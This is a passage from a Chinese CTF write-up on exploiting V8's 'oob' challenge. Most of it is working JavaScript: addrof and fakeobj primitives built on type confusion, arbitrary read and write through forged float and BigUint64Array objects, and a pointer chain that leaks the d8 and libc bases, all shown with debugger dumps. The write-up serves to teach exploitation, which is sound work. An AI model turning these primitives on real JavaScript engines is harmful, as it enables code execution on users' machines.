+<p>下面我们就来解释一下为什么这段代码能够实现浮点数和大整数的转换。我们通过调试下面的代码来解释。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">0x12345678abcdn</span>;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(overlapping_buf);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(for_double_value);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(for_bigint_value);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(<span class="title function_">int64_to_double</span>(x));</span><br><span class="line">%<span class="title class_">DebugPrint</span>(<span class="title function_">double_to_int64</span>(<span class="title function_">int64_to_double</span>(x)));</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>
+<p>下面是<code>overlapping_buf</code>的信息：</p>
+<p><img src="4.png" alt="" /></p>
+<p>可以看到，我们初始化的内存空间是保存在v8的堆中，而不是对象堆空间中。然后这个内存空间中已经成功保存了我们写入的大整数值。</p>
+<p><img src="5.png" alt="" /></p>
+<p>输出的这个10进制整数值经过验证也等于我们输入的值。</p>
+<p><img src="6.png" alt="" /></p>
+<p>这种现象产生的根本原因是，我们让两个不同类型的数组指向了同一个内存buffer。二者共用一个内存buffer，使得我们修改一个会导致另一个也发生改变。</p>
+<p>！注意：这里的<code>BigUint64Array</code>保存的<strong>并不是<code>BigInt</code>类型</strong>，实际上，如果你尝试构建一个<code>BigInt</code>数组，这个数组的类型实际为对象数组，因为<code>BigInt</code>并没有确定的大小，它随着保存的数字的大小而动态变化其占用的内存空间大小，所以在数组构建时，也只能保存其指针，类型设置为对象数组。而<code>BigUint64Array</code>的元素就是固定的64位无符号整数，这种整数表示形式不能单独存在，将其提取出来单独定义必然要将其转化为浮点数类型或大整数类型。故我们定义的<code>BigUint64Array</code>和<code>Float64Array</code>具有相同的数据长度，再加上JS允许上面的缓冲区重用，因此我们就能够实现浮点数到64位内整数的无缝无损转换。</p>
+<p>现在，我们就可以实现刚才提到的两个功能——获取任意对象的地址/将任意地址作为对象解析：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">get_object_address</span>(<span class="params">object</span>) &#123;</span><br><span class="line">    obj_arr[<span class="number">0</span>] = object;</span><br><span class="line">    obj_arr.<span class="title function_">oob</span>(float_typemap);</span><br><span class="line">    <span class="keyword">let</span> obj_addr = <span class="title function_">double_to_int64</span>(obj_arr[<span class="number">0</span>]) - <span class="number">1n</span>;</span><br><span class="line">    obj_arr.<span class="title function_">oob</span>(obj_typemap);</span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">treat_address_as_object</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    float_arr[<span class="number">0</span>] = <span class="title function_">int64_to_double</span>(addr + <span class="number">1n</span>);</span><br><span class="line">    float_arr.<span class="title function_">oob</span>(obj_typemap);</span><br><span class="line">    <span class="keyword">let</span> fake_obj = float_arr[<span class="number">0</span>];</span><br><span class="line">    float_arr.<span class="title function_">oob</span>(float_typemap);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将上面的几段代码合并，我们测试一下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// -----------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ---- int64 &lt;-&gt; double</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> overlapping_buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">var</span> for_double_value = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(overlapping_buf);</span><br><span class="line"><span class="keyword">var</span> for_bigint_value = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(overlapping_buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">double_to_int64</span>(<span class="params">double_value</span>) &#123;</span><br><span class="line">    for_double_value[<span class="number">0</span>] = double_value;</span><br><span class="line">    <span class="keyword">return</span> for_bigint_value[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">int64_to_double</span>(<span class="params">int64_value</span>) &#123;</span><br><span class="line">    for_bigint_value[<span class="number">0</span>] = int64_value;</span><br><span class="line">    <span class="keyword">return</span> for_double_value[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// -----------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ---- type confusion &amp;&amp; get object address &amp;&amp; treat address as object</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> first_object = &#123;<span class="string">&quot;1&quot;</span>: <span class="number">2</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> second_object = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_arr = [first_object, second_object];</span><br><span class="line"><span class="keyword">var</span> float_arr = [<span class="number">0.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_typemap = float_arr.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> obj_typemap = obj_arr.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_object_address</span>(<span class="params">object</span>) &#123;</span><br><span class="line">    obj_arr[<span class="number">0</span>] = object;</span><br><span class="line">    obj_arr.<span class="title function_">oob</span>(float_typemap);</span><br><span class="line">    <span class="keyword">let</span> obj_addr = <span class="title function_">double_to_int64</span>(obj_arr[<span class="number">0</span>]) - <span class="number">1n</span>;</span><br><span class="line">    obj_arr.<span class="title function_">oob</span>(obj_typemap);</span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">treat_address_as_object</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    float_arr[<span class="number">0</span>] = <span class="title function_">int64_to_double</span>(addr + <span class="number">1n</span>);</span><br><span class="line">    float_arr.<span class="title function_">oob</span>(obj_typemap);</span><br><span class="line">    <span class="keyword">let</span> fake_obj = float_arr[<span class="number">0</span>];</span><br><span class="line">    float_arr.<span class="title function_">oob</span>(float_typemap);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> first_object_addr = <span class="title function_">get_object_address</span>(first_object);</span><br><span class="line"></span><br><span class="line"><span class="comment">// -----------------------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(first_object);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;first object address: 0x&quot;</span> + <span class="title function_">get_object_address</span>(first_object).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br></pre></td></tr></table></figure>
+<p><img src="7.png" alt="" /></p>
+<p>成功。</p>
+<h2 id="c3-rw-anywhere"><a class="markdownIt-Anchor" href="#c3-rw-anywhere"></a> C.3 R/W Anywhere</h2>
+<p>刚才我们更进一步，完成了对象的伪造以及对象地址的获取，下面我们需要进一步通过这个完成任意地址的读写操作。</p>
+<p>思路其实也很简单，我们直接创建一个数组，里面伪造一下数组的对象结构，包括map指针、缓冲区指针等，然后通过将这个地方视作假对象，访问数组成员，即可实现对缓冲区指针的读写。</p>
+<p>因此，我们下面就需要明确两个方面：要伪造一个能够正常使用的数组需要伪造哪些东西；使用什么对象来保存伪造的<code>BigUint64Array</code>。</p>
+<p>首先看第二点，我们貌似可以使用一个<code>BigUint64Array</code>保存伪造的数组，但问题是这个对象应该如何初始化。如果我们通过初始化<code>ArrayBuffer</code>的方式来初始化它，那么内存中的对象结构就是下面这样：</p>
+<p><img src="8.png" alt="" /></p>
+<p>可以看到，我们实际的缓冲区并不是<code>elements</code>中保存的<code>base_pointer</code>指针，而是在<code>external_pointer</code>中。这种数据结构与我们之前定义的对象数组<code>obj_arr</code>不同。如果我们获取<code>obj_arr</code>的<code>elements</code>的类型信息与上面相比较，可以发现：</p>
+<p><img src="9.png" alt="" /></p>
+<p>直接通过初始值初始化的数组，其<code>elements</code>比通过缓冲区初始化的数组多了一个属性：<code>non-extensible</code>，即不可扩展性。这里并不是说我们不能为<code>obj_arr</code>添加其他元素，而是说这个保存元素的数组本身不能进行扩充，如果需要扩充数组长度，必须在其他地方重新分配更大的空间来保存元素。既然这里的数组不可扩展，那么在内存中，它就会直接保存元素的值，在对象数组中是指针。而对于使用缓冲区初始化的数组来说，我们获取了<code>elements</code>地址还不够，还需要获取<code>elements</code>中的<code>external_pointer</code>的值，然后才能真正访问到数组内容。</p>
+<p>因此为了简单起见，我们应该使用通过值来初始化数组。但前面也提到了，我们无法使用大整数值直接对<code>BigUintArray</code>进行初始化，因此我们只能使用浮点数数组完成初始化，因为将浮点数使用中括号括起来就表示浮点数数组，而将大整数使用中括号括起来却不表示<code>BigUintArray</code>。不过我们不用担心浮点数精度损失的问题，因为我们已经定义好了浮点数和64位整数相互转换的函数。</p>
+<p>好，现在我们已经确定使用浮点数数组来保存伪造的对象，为了简单起见，在数组内部，我们也应该使用浮点数数组作为伪造的对象，因为我们目前已经知道了浮点数数组的map地址，可以直接拿来使用。</p>
+<p>下面我们回顾一下浮点数数组对象的数据结构：</p>
+<p><img src="10.png" alt="" /></p>
+<p>一个浮点数数组对象，不包括指针的大小是0x20，需要保存：map指针、property指针、elements指针、32位的0占位和32位长度值。这是oob题的7.5版本的结构，我们再来看一下最新的13.3.0版本：</p>
+<p>新版本默认将指针进行压缩，因此大小变为原来的一半，长度值的保存有些微变化，最后1位作为整数的标志位，故长度值实际使用31位保存，整体上来看区别不大，我们如果在新版本上定义<code>oob</code>函数，最后一样能够实现类似的效果，只是需要对指针进行进一步的处理，如此时通过<code>oob</code>获取的指针需要取低4字节，且我们无法获知实际指针的高4字节，但也没关系。我们还能够获取数组结构的<code>property</code>指针的低4字节，也就是<code>oob</code>获取的指针值的高4字节。</p>
+<p>不过下面我们还是首先从7.5版本入手。</p>
+<p>在7.5版本中，指针全部是8个字节大小，因此我们不能获得<code>property</code>指针，但数组元素的访问并不需要使用<code>property</code>指针，因此我们直接设置为0即可。另外要注意指针的设置，<code>elements</code>的前面两个8字节空间是分别用于保存<code>map</code>和数组长度的，访问时是从<code>elements+0x10</code>开始。下面试验一下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_object_container = [float_typemap, <span class="number">0</span>, <span class="number">0</span>, <span class="title function_">int64_to_double</span>(<span class="number">0x10n</span> * <span class="number">0x100000000n</span>)];</span><br><span class="line"><span class="keyword">var</span> container_addr = <span class="title function_">get_object_address</span>(fake_object_container);</span><br><span class="line"><span class="keyword">var</span> fake_object_addr = container_addr + <span class="number">0x30n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = <span class="title function_">treat_address_as_object</span>(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">set_addr_to_rw</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_object_container[<span class="number">2</span>] = <span class="title function_">int64_to_double</span>(addr - <span class="number">0x10n</span> + <span class="number">1n</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_rw_addr</span>(<span class="params">idx</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">double_to_int64</span>(fake_object_container[<span class="number">2</span>]) - <span class="number">1n</span> + <span class="number">0x10n</span> + <span class="title class_">BigInt</span>(idx) * <span class="number">8n</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Container address: 0x&quot;</span> + container_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="title function_">set_addr_to_rw</span>(container_addr);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Reading: 0x&quot;</span> + <span class="title function_">get_rw_addr</span>(<span class="number">1</span>).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;0x&quot;</span> + <span class="title function_">double_to_int64</span>(fake_object[<span class="number">1</span>]).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">%<span class="title class_">DebugPrint</span>(fake_object_container);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>
+<p>这里有2个小细节：<code>set_addr_to_rw</code>里面需要将传入的地址减去0x10再加上1，减去0x10刚才已经提到，要避开前面的两个字段，后面那个加上1是因为直接保存元素的数组本质上也是一个对象，也需要在末位加1进行标识。另外对于fake object的开始地址的获取，这里是将真浮点数数组对象的地址加上0x30，这是根据内存布局决定的，不同的函数调用顺序可能会导致不同的内存布局，因为对象的创建顺序可能不同。</p>
+<p><img src="12.png" alt="" /></p>
+<p><img src="13.png" alt="" /></p>
+<p>成功完成对指定地址的读操作，当然写也很简单实现。我们再将其封装一下，就变成了下面这样：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_object_container = [float_typemap, <span class="number">0</span>, <span class="number">0</span>, <span class="title function_">int64_to_double</span>(<span class="number">0x10n</span> * <span class="number">0x100000000n</span>)];</span><br><span class="line"><span class="keyword">var</span> container_addr = <span class="title function_">get_object_address</span>(fake_object_container);</span><br><span class="line"><span class="keyword">var</span> fake_object_addr = container_addr + <span class="number">0x30n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = <span class="title function_">treat_address_as_object</span>(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">set_addr_to_rw</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_object_container[<span class="number">2</span>] = <span class="title function_">int64_to_double</span>(addr - <span class="number">0x10n</span> + <span class="number">1n</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_rw_addr</span>(<span class="params">idx</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">double_to_int64</span>(fake_object_container[<span class="number">2</span>]) - <span class="number">1n</span> + <span class="number">0x10n</span> + <span class="title class_">BigInt</span>(idx) * <span class="number">8n</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read_addr</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="title function_">set_addr_to_rw</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">double_to_int64</span>(fake_object[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write_addr</span>(<span class="params">addr, value</span>) &#123;</span><br><span class="line">    <span class="title function_">set_addr_to_rw</span>(addr);</span><br><span class="line">    fake_object[<span class="number">1</span>] = <span class="title function_">int64_to_double</span>(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>至此我们就获得了内存操作至高无上的任意读写权限。</p>
+<p>虽然我们已经能够进行任意地址读写，但还需要解决最后一个问题，才能实现真正的任意代码执行，那就是如何获取libc地址、栈地址等，任意代码执行需要这些地址完成。需要注意的是，本文开头的参考文章中提到使用此类浮点数数组进行读写存在一定的问题，可能导致7f开头的地址无法读写，因此这里我们另外伪造一个以buffer初始化的数组，因为这类数组的<code>external_pointer</code>必然在v8的堆中而不在对象堆空间，所以必然是需要保存完整指针的，通过对这里进行修改，才能够实现真正的任意地址读写。</p>
+<p>因此考虑到脚本的可扩展性，我们可以通过刚才实现的浮点数数组“伪任意地址写”实现64位无符号整数数组的“真任意地址写”，实现方式也很简单，只需要将前面那个用于进行浮点数和整数转换的<code>BigUint64Array</code>复制一份，然后将堆指针修改即可。</p>
+<p>我们首先获取一下<code>BigUint64Array</code>的内存数据结构布局：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job(0x3039bc2cf0d9)</span><br><span class="line">0x3039bc2cf0d9: [JSTypedArray]</span><br><span class="line"> - map: 0x34daeca00b89 &lt;Map(BIGUINT64_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x310ba1d45469 &lt;Object map = 0x34daeca00bd9&gt;</span><br><span class="line"> - elements: 0x3039bc2cf121 &lt;FixedBigUint64Array[0]&gt; [BIGUINT64_ELEMENTS]</span><br><span class="line"> - embedder fields: 2</span><br><span class="line"> - buffer: 0x3039bc2cf031 &lt;ArrayBuffer map = 0x34daeca021b9&gt;</span><br><span class="line"> - byte_offset: 0</span><br><span class="line"> - byte_length: 32</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x2494f4ec0c71 &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; tele 0x3039bc2cf0d8</span><br><span class="line">00:0000│  0x3039bc2cf0d8 —▸ 0x34daeca00b89 ◂— 0x900002494f4ec01</span><br><span class="line">01:0008│  0x3039bc2cf0e0 —▸ 0x2494f4ec0c71 ◂— 0x2494f4ec08</span><br><span class="line">02:0010│  0x3039bc2cf0e8 —▸ 0x3039bc2cf121 ◂— 0x2494f4ec26</span><br><span class="line">03:0018│  0x3039bc2cf0f0 —▸ 0x3039bc2cf031 ◂— 0x71000034daeca021</span><br><span class="line">04:0020│  0x3039bc2cf0f8 ◂— 0</span><br><span class="line">05:0028│  0x3039bc2cf100 ◂— 0x20 /* &#x27; &#x27; */</span><br><span class="line">06:0030│  0x3039bc2cf108 ◂— 0x400000000</span><br><span class="line">07:0038│  0x3039bc2cf110 ◂— 0</span><br><span class="line">pwndbg&gt; </span><br><span class="line">08:0040│  0x3039bc2cf118 ◂— 0</span><br><span class="line">pwndbg&gt; job(0x3039bc2cf121)</span><br><span class="line">0x3039bc2cf121: [FixedBigUint64Array]</span><br><span class="line"> - map: 0x2494f4ec2629 &lt;Map&gt;</span><br><span class="line"> - length: 0</span><br><span class="line"> - base_pointer: &lt;nullptr&gt;</span><br><span class="line"> - external_pointer: 0x5592936e2030</span><br><span class="line">pwndbg&gt; tele 0x3039bc2cf120</span><br><span class="line">00:0000│  0x3039bc2cf120 —▸ 0x2494f4ec2629 ◂— 0x2494f4ec01</span><br><span class="line">01:0008│  0x3039bc2cf128 ◂— 0</span><br><span class="line">02:0010│  0x3039bc2cf130 ◂— 0</span><br><span class="line">03:0018│  0x3039bc2cf138 —▸ 0x5592936e2030 —▸ 0x3039bc2cf3f1 ◂— 0x34daeca02e</span><br></pre></td></tr></table></figure>
+<p>数组对象本身的大小为0x48个字节，保存堆地址的数组的大小为0x20个字节（且二者在内存中相邻），我们可以直接创建一个新的大小为0x68的浮点数数组，然后将这些内容复制进去：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_bigint64arr_container = [<span class="number">0.1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> off = <span class="number">0</span>; off &lt; <span class="number">13</span>; off++) &#123;</span><br><span class="line">    <span class="keyword">let</span> v = <span class="title function_">read_addr</span>(<span class="title function_">get_object_address</span>(for_bigint_value) + <span class="title class_">BigInt</span>(off) * <span class="number">8n</span>);</span><br><span class="line">    fake_bigint64arr_container[off] = <span class="title function_">int64_to_double</span>(v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// change the elements pointer</span></span><br><span class="line">fake_bigint64arr_container[<span class="number">2</span>] = <span class="title function_">int64_to_double</span>(<span class="title function_">get_object_address</span>(fake_bigint64arr_container) - <span class="number">0x20n</span> + <span class="number">1n</span>);</span><br><span class="line"><span class="comment">// get the heap pointer</span></span><br><span class="line">heap_addr = <span class="title function_">double_to_int64</span>(fake_bigint64arr_container[<span class="number">12</span>]);</span><br><span class="line">fake_bigintarr = <span class="title function_">treat_address_as_object</span>(<span class="title function_">get_object_address</span>(fake_bigint64arr_container) - <span class="number">0x68n</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read_at</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_bigint64arr_container[<span class="number">12</span>] = <span class="title function_">int64_to_double</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> fake_bigintarr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write_at</span>(<span class="params">addr, value</span>) &#123;</span><br><span class="line">    fake_bigint64arr_container[<span class="number">12</span>] = <span class="title function_">int64_to_double</span>(addr);</span><br><span class="line">    fake_bigintarr[<span class="number">0</span>] = value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>至此，正式攻击前的所有准备工作我们都已经安排妥当，而且我们还获取到了一个有效的堆地址。</p>
+<p>注：在高版本下开启指针压缩的情况下，v8早就考虑到了相关的安全隐患，导致我们可能无法在整个对象堆空间中找到哪怕一个堆/libc/d8代码地址。至于这种情况下的堆指针如何获取，我们以后再来探究。</p>
+<h2 id="c4-getting-memory-maps"><a class="markdownIt-Anchor" href="#c4-getting-memory-maps"></a> C.4 Getting Memory Maps</h2>
+<p>下面，我们需要思考的是，如何获取libc地址，这对于漏洞利用至关重要。</p>
+<p>其实都走到这一步了，想要获取也不是一件难事。如果在调试时查看一下堆空间就可以知道，堆中存在几个已经被释放的大chunk，其中必然包含指向<code>main_arena</code>的指针。我们可以根据读取到的值大小来判断这到底是不是libc的指针，然后向前寻找，知道找到libc开头的标志性ELF字符串，这样就可以获取到libc基地址了。但这种方法的问题在于不稳定，虽然成功率很高但是效率太低，如果是远程环境的话可能需要很长时间。</p>
+<p>下面介绍一条稳定的链条，通过这个指针链，可以找到d8 ELF中的代码地址。根据这个地址，可以获取d8 ELF的基地址，进而通过stdin这样的label获取libc基地址。</p>
+<p>这条链的操作流程：找到任意一个map -&gt; 找到map中的constructor地址 -&gt; 找到constructor中的code地址 -&gt; 该地址下方会保存一段代码，在代码中存在<code>movabs</code>指令，其操作数为一个d8 ELF内地址。</p>
+<p>需要注意的是，不同的map可能有不同的地址偏移，需要选择合适的map。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> typemap = <span class="title function_">double_to_int64</span>(fake_bigint64arr_container[<span class="number">0</span>]) - <span class="number">1n</span>;</span><br><span class="line"><span class="keyword">var</span> constructor = <span class="title function_">read_at</span>(typemap + <span class="number">0x20n</span>) - <span class="number">1n</span>;</span><br><span class="line"><span class="keyword">var</span> code = <span class="title function_">read_at</span>(constructor + <span class="number">0x30n</span>) - <span class="number">1n</span>;</span><br><span class="line"><span class="keyword">var</span> elf_code_addr = <span class="title function_">read_at</span>(code + <span class="number">0x42n</span>);</span><br><span class="line"><span class="keyword">var</span> elf_base = elf_code_addr - <span class="number">0x10274E0n</span>;</span><br></pre></td></tr></table></figure>
+<p>获取了ELF基地址之后，下面需要从ELF中提取libc地址，注意到这个地方：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x56218bf4b518</span><br><span class="line">00:0000│  0x56218bf4b518 (__cxa_terminate_handler) —▸ 0x7f89e51aa41a (abort) ◂— push rbp</span><br><span class="line">01:0008│  0x56218bf4b520 (__cxa_unexpected_handler) —▸ 0x56218bd7c550 (std::terminate()) ◂— push rbx</span><br><span class="line">02:0010│  0x56218bf4b528 (v8::base::ieee754::atan2(double, double)::tiny) ◂— 0x1a56e1fc2f8f359</span><br><span class="line">03:0018│  0x56218bf4b530 (v8::base::ieee754::atan2(double, double)::pi_lo) ◂— 0x3ca1a62633145c07</span><br></pre></td></tr></table></figure>
+<p>这里的<code>abort</code>函数是libc内函数，因此可以通过这个函数得到libc的基地址：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> abort_addr = <span class="title function_">read_at</span>(elf_base + <span class="number">0x12B4518n</span>);</span><br><span class="line"><span class="keyword">var</span> libc_base = abort_addr - <span class="number">0x2641an</span>;</span><br></pre></td></tr></table></figure>
+<h2 id="c5-rop-orw"><a class="markdownIt-Anchor" href="#c5-rop-orw"></a> C.5 ROP &amp;&amp; ORW</h2>
